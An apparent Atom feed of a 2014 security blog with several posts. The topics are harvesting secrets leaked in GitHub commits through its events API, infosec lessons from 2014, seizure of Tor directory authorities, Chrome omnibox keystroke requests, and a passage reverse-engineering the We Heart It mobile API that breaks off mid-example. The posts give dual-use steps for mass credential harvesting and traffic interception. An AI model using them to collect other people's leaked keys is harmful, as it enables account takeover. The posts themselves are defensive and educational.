<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[jordan-wright]]></title>
  <link href="http://jordan-wright.github.io/atom.xml" rel="self"/>
  <link href="http://jordan-wright.github.io/"/>
  <updated>2014-12-30T20:42:43-06:00</updated>
  <id>http://jordan-wright.github.io/</id>
  <author>
    <name><![CDATA[Jordan]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Why Deleting Sensitive Information from Github Doesn't Save You]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/30/why-deleting-sensitive-information-from-github-doesnt-save-you/"/>
    <updated>2014-12-30T19:19:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/30/why-deleting-sensitive-information-from-github-doesnt-save-you</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/harvest_github.png"/></p>

<p>So you accidentally committed a password or API key to Github. <strong><em>Ouch.</em></strong></p>

<p>&ldquo;No problem!&rdquo;, you think, &ldquo;I&rsquo;ll just follow Github&rsquo;s helpful information on <a href="https://help.github.com/articles/remove-sensitive-data/">how to delete sensitive information</a> and I&rsquo;ll be fine!&rdquo;</p>

<p>Just today, I saw a <a href="http://www.devfactor.net/2014/12/30/2375-amazon-mistake/">great article</a> detailing one developer&rsquo;s experience with committing sensitive information to Github. Unfortunately, this article missed the main point. In this post, I&rsquo;m going to show exactly how hackers <em>instantly</em> harvest information committed to public Github repositories, and why deleting this information doesn&rsquo;t solve the problem.</p>

<h3>Drinking from Github&rsquo;s Firehose</h3>

<p>Github has an extensive API. One of the most useful endpoints is located at <a href="https://developer.github.com/v3/activity/events/"><code>/events</code></a>. This endpoint basically provides a firehose of <em>all</em> public events as they happen. This includes account creation, code commits, and more. Just &ldquo;star&rdquo; a repository? It was published at <code>/events</code>.</p>

<p>Hackers can use this endpoint to watch for any and all code commits. Once a commit is found, they can instantly make a request to the <a href="https://developer.github.com/v3/git/commits/"><code>repos/:owner/:repo/git/commits/:sha1</code></a> endpoint to get the details for that commit. Part of these details is a reference to the project snapshot, or <code>tree</code>, for that commit (the files themselves). This tree has it&rsquo;s own SHA1, that can be used in the <a href="https://developer.github.com/v3/git/trees/"><code>repos/:owner/:repo/git/tree/:sha1?recursive=1</code></a> endpoint to get a full listing of files in the repository.</p>

<p>Each of these listings has a reference to the file&rsquo;s actual content for the commit. A request can be made to the <a href="https://developer.github.com/v3/git/blobs/"><code>/repos/:owner/:repo/git/blobs/:sha1</code></a> endpoint to get this file content, which will include the sensitive information!</p>

<p>These 4 requests are made in a matter of seconds, and can be sped up by caching the SHA1 of files to determine if the file has been changed. It&rsquo;s a good thing that no one has made a system that&rsquo;s been caching all this data this entire time, right?</p>

<h3>Say Hello to GHTorrent</h3>

<p><a href="http://ghtorrent.org/">GHTorrent</a> advertises itself as an &ldquo;offline mirror of data&rdquo;. In a nutshell, it keeps track of <em>a ton</em> of data that flows through Github&rsquo;s Events API stream, and recursively resolves dependencies to relate, say, a commit object to an event object. Currently, they suggest they have accumulated the data from 2012-2014.</p>

<p>This database has incredible potential for researchers, but also allows for hackers to pull previously deleted or changed data en masse. Granted, from what I can tell they don&rsquo;t store the actual file content (so your accidentally committed password won&rsquo;t be stored), but that doesn&rsquo;t mean that there isn&rsquo;t sensitive data to be had.</p>

<p>Consider the email address used to create a Github account, or commit a code change. Both of these actions created an event that was harvested by GHTorrent. Here&rsquo;s an example showing the details of a particularly <a href="https://github.com/jordan-wright">talented developer</a>:</p>

<p><img src="http://jordan-wright.github.io/images/blog/harvest_github/db.png"/></p>

<p>Currently, it looks like there are about 4.7 million accounts cached in GHTorrent, with over 3.4 million having a non-null email address. That&rsquo;s a lot of email addresses.</p>

<p>GHTorrent is just an example. While it doesn&rsquo;t appear to store all content, it would be trivial for hackers to reproduce the project with the added feature of searching commits for sensitive information as the events are generated. This searching can be done using keywords such as &ldquo;password&rdquo;, &ldquo;key&rdquo;, etc.</p>

<h3>The Only Way to be Safe</h3>

<p>Hopefully it&rsquo;s clear that deleting sensitive information from Github doesn&rsquo;t solve the problem. The <strong>only</strong> way to protect your assets after committing sensitive information is to consider the information compromised and to change the password/API key/whatever. Then, make sure to avoid committing this data in the future!</p>

<p>Be smart &ndash; protect your data.</p>

<p>-Jordan (<a href="https://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What InfoSec Learned in 2014]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/28/what-infosec-learned-in-2014/"/>
    <updated>2014-12-28T20:38:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/28/what-infosec-learned-in-2014</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/what_infosec_2014.png"/></p>

<p><em>Busy year.</em></p>

<p>It seems as though each year brings more and more events that throw our industry into the forefront of attention &ndash; and they&rsquo;re never good. At the same time, it&rsquo;s key to remember that these events allow us to learn and evolve as an industry. Let&rsquo;s take a look at some of the key things we as an infosec industry can learn from 2014:</p>

<!--more-->


<p><img class="section_header" src="http://jordan-wright.github.io/images/blog/infosec_2014/heartbleed.png"/></p>

<h3>No Software is Safe, or Why Your Vulnerability Doesn&rsquo;t Need a Logo</h3>

<p>Heartbleed and Shellshock were arguably two of the most critical vulnerabilities our industry has seen in a while. These vulnerabilities provided a stark reminder that &ndash; as the security community often quips &ndash; no software is safe. The importance and widespread use of both OpenSSL and Bash contributed to a large, immediate impact when the vulnerabilities were announced.</p>

<p>This impact was also largely fueled by the media. Now, many people would take the stark stance that assigning names and logos to vulnerabilities is ridiculous, and I mostly agree. However, it&rsquo;s important to at least consider the benefits this approach had. Too often, vulnerabilities aren&rsquo;t patched because they simply aren&rsquo;t kept up with. It&rsquo;s mind numbing trying to keep up with every CVE-<em>xxxx</em> affecting every piece of software. In these cases, since the vulnerabilities were critical enough, this approach of marketing to the media worked really well &ndash; many systems were patched quickly<sup>1</sup>.</p>

<p>But sadly, we can already see this being overused. It seems as though anyone who thinks they have found a critical vulnerability needs to find some kind of catchy name to put with it. And I get it &ndash; CVE-2014-0160 isn&rsquo;t as dangerous sounding as <strong><em>Heartbleed</em></strong>, and CVE-2014-6271 + related isn&rsquo;t as hacker-scary sounding as <strong><em>Shellshock</em></strong>. Add logos to go with the catchy names? Marketing people <strong>love</strong> it.</p>

<p>I have no doubt that 2015 will bring with it more critical vulnerabilities in well-known, established pieces of software. I only hope that we can use the lessons-learned from Heartbleed and Shellshock to mature as an industry and approach the marketing and distribution of these details in a responsible, controlled way. Not every vulnerability needs a full marketing team behind it.</p>

<p><img class="section_header" src="http://jordan-wright.github.io/images/blog/infosec_2014/router.png"/></p>

<h3>Embedded Devices: Hacking Like it&rsquo;s 1995</h3>

<p>While the (in)security of embedded devices such as SOHO routers isn&rsquo;t particularly new, there were a substantial number of critical vulnerabilities recently released for these devices. These vulnerabilities includes <a href="https://github.com/elvanderb/TCP-32764">blatant</a> <a href="http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/">backdoors</a>, web-app security 101 <a href="http://mis.fortunecook.ie/">blunders</a>, or just bad software.</p>

<p>The primary cause for concern with these vulnerabilities is that they affect a <em>ton</em> of devices. For example, the recently reported <a href="http://mis.fortunecook.ie/">&ldquo;Misfortune Cookie&rdquo;</a> vulnerability &ndash; complete with a name and logo &ndash; claims to affect &ldquo;12 million &hellip; unique devices&rdquo;. Unfortunately, security appears to be put on the backburner when it comes to the development of embedded devices, likely due to either infosec ignorance or simply because manufacturers don&rsquo;t think attackers will target their systems &ndash; I am a fan of the latter.</p>

<p>I wholeheartedly expect to see a wider emphasis put on attacking embedded devices &ndash; particularly network devices &ndash; in 2015. The fact that in 2012 over 400,000 devices can be <a href="http://internetcensus2012.bitbucket.org/paper.html">commandeered using default passwords</a> alone should be considered a substantial threat. Sadly, it will only get worse before it gets better. The only way to fix the situation will be to continue finding and publishing vulnerabilities in these devices in the hopes that manufacturers will start placing a higher emphasis on device security.</p>

<p>Here&rsquo;s hoping for the best.</p>

<p><img class="section_header" src="http://jordan-wright.github.io/images/blog/infosec_2014/pos.png"/></p>

<h3>POS Software = POS</h3>

<p>Compromising Point-of-Sale (POS) devices became the new-hotness for cybercriminals this year. Notable breaches of retailers such as Target and Home Depot caused massive re-issuing of bank credit/debit cards, hefty financial losses, and resulted in some nice <a href="http://cdn.arstechnica.net/wp-content/uploads/2014/12/document4.pdf">class action complaint readings</a>.</p>

<p>The key thing to note about these breaches is that POS malware such as <a href="http://blog.spiderlabs.com/2013/05/alina-shedding-some-light-on-this-malware-family.html">Alina</a>, <a href="http://blog.spiderlabs.com/2014/02/jackpos-the-house-always-wins.html">JackPOS</a>, etc. <strong>is not sophisticated</strong>. It&rsquo;s not. Generally, it works like this:</p>

<ul>
<li>Check if a POS software process is running</li>
<li>Dump the memory of that process</li>
<li>Grep for 16 numbers in a row</li>
<li>Validate it&rsquo;s a valid CC using something like Luhn&rsquo;s algorithm</li>
<li>Send it off to a server</li>
<li>Repeat</li>
</ul>


<p><em>Groundbreaking.</em></p>

<p>So why did this work so well? Turns out, these POS systems (like embedded devices) have not gone through through the gamut of security scrutiny that standard software has. This makes sense, since the market-share for this software was much smaller (meaning less installs of the software than, say, Java or Flash).</p>

<p>But the criminals figured something out. Maybe market share isn&rsquo;t as important as we thought it was. Maybe there is low-hanging fruit that can give enough yield when compromised that it&rsquo;s worth looking into. A <a href="https://www.fox-it.com/en/files/2014/12/Anunak_APT-against-financial-institutions2.pdf">recent report</a> by security firm Fox-IT summed it up nicely:</p>

<blockquote><p>[Hackers] can steal $2000 a thousand times, and earn $2 million, but also they can steal it in one time and immediately get it with much less effort&hellip;</p></blockquote>

<p>Don&rsquo;t get me wrong &ndash; consumer malware families like Zeus will still have a place in the industry while there is money to be made in selling harvested information. However, I have no doubt that Target and Home Depot will only be the beginning of these retailer breaches, at least until chip-and-pin cards are the industry default.</p>

<h3>Conclusion</h3>

<p>It&rsquo;s clear that our industry is showing no signs of slowing down (and hey, I <span><i class="fa fa-heart-o"></i> job security</span>). However, we need to push forward into the next year with the mindset that <em>we&rsquo;re still losing</em>. This next year will bring more breaches, more vulnerabilities, and more lessons to be learned.</p>

<p>As always, let me know if you have any questions or comments below.</p>

<p>[1] <a href="https://jhalderm.com/pub/papers/heartbleed-imc14.pdf">https://jhalderm.com/pub/papers/heartbleed-imc14.pdf</a></p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What Happens if Tor Directory Authorities are Seized?]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/19/what-happens-if-tor-directory-authorities-are-seized/"/>
    <updated>2014-12-19T18:43:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/19/what-happens-if-tor-directory-authorities-are-seized</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/tor_seized.png"/></p>

<h3>Introduction</h3>

<p>The Tor Project <a href="https://blog.torproject.org/blog/possible-upcoming-attempts-disable-tor-network">has announced</a> that they have received threats about possible upcoming attempts to disable the Tor network through the seizure of Directory Authority (DA) servers. While we don&rsquo;t know the legitimacy behind these threats, it&rsquo;s worth looking at the role DA&rsquo;s play in the Tor network, showing what effects their seizure could have on the Tor network.*</p>

<!--more-->


<h3>What are Directory Authorities?</h3>

<p>Simply put, think of the DA servers as the trusted providers of a phonebook. This phonebook &ndash; called the <em>consensus</em> &ndash; contains the complete information about each known Tor relay, and is updated every hour. When it&rsquo;s time to update the list, a majority of the directory authorities must agree on the accuracy of the new list by cryptographically signing the proposed consensus. Once this process is complete, clients are able to download the updated list of relays.</p>

<p>There are currently 10 DA&rsquo;s whose information is <a href="https://gitweb.torproject.org/tor.git/tree/src/or/config.c#n824">hardcoded into Tor clients</a> &ndash; one of which (Tonga) is used for bridge access. This means that, to keep the network updated and stable, <strong>5 DA&rsquo;s must still be operational</strong>. If a seizure attempt is able to take down 5 or more DA&rsquo;s, the network will enter an unstable state, and the integrity of any updates to the consensus cannot be guaranteed.</p>

<h3>Where are the DA&rsquo;s Located?</h3>

<p>The seizure of 5 or more DA&rsquo;s would be a large feat, but it is absolutely possible. As one commenter on HN <a href="https://news.ycombinator.com/item?id=8775028">mentioned</a>, it would only take a joint effort by the US and Germany to take down 5 DA servers. Another <a href="https://news.ycombinator.com/item?id=8775009">comment</a> provides the geolocation and organization of each DA.</p>

<h3>The Aftermath</h3>

<p>An attack seizing the DA servers would severely cripple the Tor network. The Tor Project would not only need to replace the DA servers, but would then need to introduce a client update with the new DA information. During this time, the integrity of the consensus could not be trusted, and it would be <a href="https://blog.torproject.org/blog/possible-upcoming-attempts-disable-tor-network#comment-83762">increasingly difficult</a> for new clients to be introduced into the Tor network.</p>

<h3>This Doesn&rsquo;t Solve the Problem</h3>

<p>It&rsquo;s important to note that severing the Tor network doesn&rsquo;t solve any problem. Tor provides an invaluable escape from censorship, and the means to having privacy from otherwise prying eyes. I&rsquo;m confident that the Tor Project will be resilient in recovering from any attempted takedown attempts.</p>

<h3>More Information</h3>

<p>Further information and detailed status (obtained from the updated consensus) about each of the Tor Directory Authorities can be found at the following links:</p>

<ul>
<li><a href="https://globe.torproject.org/#/relay/CF6D0AAFB385BE71B8E111FC5CFF4B47923733BC">Faravahar &ndash; 154.35.32.5:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/0AD3FA884D18F89EEA2D89C019379E0E7FD94417">urras &ndash; 208.83.223.34:80</a></li>
<li><a href="https://globe.torproject.org/#/relay/7BE683E65D48141321C5ED92F075C55364AC7123">dannenberg &ndash; 193.23.244.244:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/4A0CCD2DDC7995083D73F5D667100C8A5831F16D">Tonga (<strong>bridge DA</strong>) &ndash; 82.94.251.203:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/9695DFC35FFEB861329B9F1AB04C46397020CE31">moria1 &ndash; 128.31.0.34:9101</a></li>
<li><a href="https://globe.torproject.org/#/relay/BD6A829255CB08E66FBE7D3748363586E46B3810">maatuska &ndash; 171.25.193.9:80</a></li>
<li><a href="https://globe.torproject.org/#/relay/F2044413DAC2E02E3D6BCF4735A19BCA1DE97281">gabelmoo &ndash; 131.188.40.189:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/7EA6EAD6FD83083C538F44038BBFA077587DD755">dizum &ndash; 194.109.206.212:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/74A910646BCEEFBCD2E874FC1DC997430F968145">longclaw &ndash; 199.254.238.52:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/847B1F850344D7876491A54892F904934E4EB85D">tor26 &ndash; 86.59.21.38:443</a></li>
</ul>


<p>Information regarding any updates to this situation can be found on the <a href="https://blog.torproject.org/blog/">Tor Project blog</a>.</p>

<p>As always, let me know if you have any questions or comments below!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>

<p><em>*It is worth noting that I am by no means a Tor expert, and am relying on knowledge gained from <a href="http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python/">previous</a> <a href="http://raidersec.blogspot.com/2013/09/mapping-tor-relays-and-exit-nodes.html">research</a> into the Tor network structure.</em></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Chrome Tracks Every Key Typed into the Omnibox]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/18/chrome-tracks-every-key-typed-into-omnibox/"/>
    <updated>2014-12-18T23:43:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/18/chrome-tracks-every-key-typed-into-omnibox</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/browser_tracking.png"/></p>

<blockquote><p>Friendly Reminder: Browser makers may track every key you type in the URL bar</p></blockquote>

<h3>Introduction</h3>

<p>Technologies like Google Chrome&rsquo;s Omnibox makes searching easier. However, these quick search suggestions come at a price. This post is a friendly reminder that you may want to consider turning off predictive search to protect your privacy.</p>

<!--more-->


<h3>How the Omnibox Works</h3>

<p>Predictive search isn&rsquo;t magic. Chrome doesn&rsquo;t come shipped with a built-in collection of popular searches. No, the only way to get suggestions for what you are searching is to <em>ask Google</em>. This happens by sending a request to Google for search suggestions <strong>for every key typed in the omnibox</strong> &ndash; by default.</p>

<p>What does this look like? After installing Burp&rsquo;s CA certificate and starting <code>chrome.exe</code> with the <code>--allow-ssl-mitm-proxies</code> option, we can see the following requests pop up as we search:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=o
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=om
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omg
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgw
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwt
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtf
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtfb
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtfbb
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtfbbq</span></code></pre></td></tr></table></div></figure>


<blockquote><p><em>But I&rsquo;m searching these things anyway!</em></p></blockquote>

<p>Sure, this might be fine for searches, but what else could be sent via this method? Hostnames, web addresses, and IP addresses are <strong><em>all</em></strong> sent to Google before you press enter. This means that Google knows if you visit a website, even if you don&rsquo;t visit the site from search results.</p>

<h4>Disabling Omnibox</h4>

<p>Since this setting is enabled by default, here&rsquo;s how to disable it:</p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#019875"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">1</i>
</span> Navigate to <code>chrome://settings</code></p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#019875"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">2</i>
</span> Click &ldquo;Show Advanced Settings&rdquo;</p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#019875"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">3</i>
</span> Uncheck &ldquo;Use a prediction service to help complete searches&hellip;&rdquo;</p>

<p><img src="http://jordan-wright.github.io/images/blog/browser_track/omnibox.png"/></p>

<h3>Chrome Isn&rsquo;t the Only One</h3>

<p>It&rsquo;s important to note that Chrome isn&rsquo;t the only browser that has this capability. Internet Explorer has the same feature from Bing. The only difference is that this isn&rsquo;t default behavior, and has to be explicitly enabled.</p>

<h3>Putting Things in Perspective</h3>

<p>This isn&rsquo;t new information &ndash; more of a friendly reminder. It&rsquo;s important to put these privacy &ldquo;risks&rdquo; in perspective and determine what is more important to you &ndash; keeping your browsing history and IP/hostname scheme private, or getting solid search suggestions.</p>

<p>As always, let me know if you have any questions/comments below.</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My (Probably Boring) Research Papers on Security]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/02/my-probably-boring-research-papers-on-security/"/>
    <updated>2014-12-02T22:50:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/02/my-probably-boring-research-papers-on-security</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/papers.png"/></p>

<h3>Introduction</h3>

<p>I&rsquo;ve always been a proponent and contributor of open-source projects and information. I strongly believe that information and knowledge should be shared as much and as freely as possible &ndash; progress happens this way.</p>

<p>As such, I&rsquo;ve decided to &ldquo;open-source&rdquo;, if you will, the academic essays I wrote regarding information security and software development my last couple of semesters at Texas Tech. It&rsquo;s my hope that people find these useful, either by provoking thought and discussion or simply by serving as material to help people fall asleep a little easier.</p>

<p>Please bear in mind some of these papers were written <del>the night before</del> in a short time-span.</p>

<!--more-->


<h3>The Papers</h3>

<p>Here are the papers (in no particular order):</p>

<ul>
<li><a href="https://www.dropbox.com/s/y7mz05n47zs71qu/A%20Systems%20Analysis%20of%20the%20Cybercrime%20Industry.pdf?dl=0"><em>A Systems Analysis of the Cybercrime Industry</em></a> &ndash; A formal systems analysis of the current cybercrime industry, showing how this industry is similar to &ldquo;a market for lemons&rdquo;.</li>
<li><a href="https://www.dropbox.com/s/rvk6ybbl85zce00/The%20Fault%20Tolerance%20of%20Botnets.pdf?dl=0"><em>The Fault Tolerance of Botnets</em></a> &ndash; Studying fault tolerant models of botnets</li>
<li><a href="https://www.dropbox.com/s/jy8v6tmsjyr65z5/The%20State%20of%20Email%20Security.pdf?dl=0"><em>The State of Email Security</em></a> &ndash; A study regarding the history and current state of email threats and subsequent security mitigations.</li>
<li><a href="https://www.dropbox.com/s/db2tbau0jdv9pym/Paradigm%20Exercise.pdf?dl=0"><em>Paradigm Shift in Software Development</em></a> &ndash; A brief look into how the creation and establishment of the OSS movement created a paradigm shift in software development methodologies.</li>
</ul>


<p>As always, let me know if you have any questions or comments below! It is worth noting that I do my best to provide the best attribution possible, but if you find mistakes please let me know and I will correct it immediately.</p>

<p>Enjoy!</p>

<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Reverse Engineering the We Heart It API]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/10/12/reverse-engineering-the-we-heart-it-api/"/>
    <updated>2014-10-12T20:40:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/10/12/reverse-engineering-the-we-heart-it-api</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/weheartit_api.png"/></p>

<h3>Introduction</h3>

<p>A while back, I came across the article from the The Washington Post describing We Heart It, a social network claiming <a href="http://www.washingtonpost.com/news/the-intersect/wp/2014/05/07/30-million-people-use-this-social-network-and-youve-probably-never-heard-of-it/">over 30 million users</a>. If you haven&rsquo;t seen it, <a href="http://weheartit.com">We Heart It</a> (from here on out abbreviated as WHI) is a social network which encourages people to post and share photos and images of things that inspire them.</p>

<p>Having such a large user-base, I was interested in seeing what kind of API the site offered developers. However, I was disappointed when I found out that the API was <a href="https://weheartit.com/partners">closed to &ldquo;partners&rdquo;</a>, and even this is not a full REST API, but rather a simple button developers can place on their website to allow users to interact with WHI.</p>

<p>With this being the case, I decided to take a look at the Android and iPhone apps using both static and dynamic analysis in an experiment to see if I could reverse engineer the API used on the backend. Here are the results.</p>

<!--more-->


<h3>Dynamic Analysis</h3>

<p>Dynamic analysis is generally a bit quicker and can help give a good overview into how the application functions. By <a href="http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/">intercepting traffic using a proxy</a>, we can easily analyze the structure of requests/responses in use by the application.</p>

<h4>Registration &amp; Authentication</h4>

<p>Loading up the WHI iPhone app and attempting to register an account shows the following request/response:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /api/users HTTP/1.1
</span><span class='line'>Host: api.weheartit.com
</span><span class='line'>
</span><span class='line'>&lt;snip&gt;
</span><span class='line'>client_id=redacted
</span><span class='line'>&client_secret=redacted
</span><span class='line'>&user[email]=redacted
</span><span class='line'>&user[name]=redacted
</span><span class='line'>&user[password]=redacted
</span><span class='line'>&user[username]=redacted
</span><span class='line'>
</span><span class='line'>{
</span><span class='line'>    "result":"success",
</span><span class='line'>    "object":
</span><span class='line'>    {   "id":27215547,
</span><span class='line'>            "username":"jordan_test2",
</span><span class='line'>            "name":"Jordan Test",
</span><span class='line'>            "location":"",
</span><span class='line'>            "bio":"",
</span><span class='line'>            &lt;snip&gt;
</span><span class='line'>            "public_account":true,
</span><span class='line'>            "verified":false,
</span><span class='line'>            "created_at":"2014-10-12T18:38:35Z",
</span><span class='line'>            "email":"redacted",
</span><span class='line'>            "cover_image": { &lt;snip&gt; }
</span><span class='line'>    }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p><em>Note: I originally contacted the WHI security team since the login page (and every other page) was served via HTTP. This has since been fixed.</em></p>

<p>Registering an account automatically logs the user in. This launches the OAuth2 authentication flow to generate an access token which is used in an <code>Authorization: Bearer</code> header for all API calls:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /oauth/token HTTP/1.1
</span><span class='line'>Host: api.weheartit.com
</span><span class='line'>
</span><span class='line'>&lt;snip&gt;
</span><span class='line'>client_id=redacted
</span><span class='line'>&client_secret=redacted
</span><span class='line'>&grant_type=password
</span><span class='line'>&password=redacted
</span><span class='line'>&username=redacted
</span><span class='line'>
</span><span class='line'>{
</span><span class='line'>    "access_token":"redacted",
</span><span class='line'>    "token_type":"bearer",
</span><span class='line'>    "expires_in":31104000,
</span><span class='line'>    "refresh_token":"redacted",
</span><span class='line'>    "scope":"public"
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>This token is then used to make API calls to the WeHeartIt backend using a RESTful JSON API. Here are a couple of examples of this (some response details have been removed for brevity):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /api/v2/entries/85847648 HTTP/1.1
</span><span class='line'>Host: api.weheartit.com
</span><span class='line'>Authorization: Bearer [redacted]
</span><span class='line'>
</span><span class='line'>{
</span><span class='line'>    "id": 85847648,
</span><span class='line'>    "title": "Colors",
</span><span class='line'>    &lt;snip&gt;
</span><span class='line'>    "hearts_count": 11285,
</span><span class='line'>    "created_at": "2013-11-10T17:09:49Z",
</span><span class='line'>    "hearted": false,
</span><span class='line'>    "via_hearts_count": 9919,
</span><span class='line'>    "tags": [&lt;snip&gt;],
</span><span class='line'>    "creator": {
</span><span class='line'>        "id": 6043210,
</span><span class='line'>        "username": "Natasja4205",
</span><span class='line'>        &lt;snip&gt;
</span><span class='line'>    },
</span><span class='line'>    "user": {
</span><span class='line'>        "id": 6043210,
</span><span class='line'>        "username": "Natasja4205",
</span><span class='line'>        &lt;snip&gt;
</span><span class='line'>    }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /api/v2/users/27215547 HTTP/1.1
</span><span class='line'>Host: api.weheartit.com
</span><span class='line'>Authorization: Bearer [redacted]
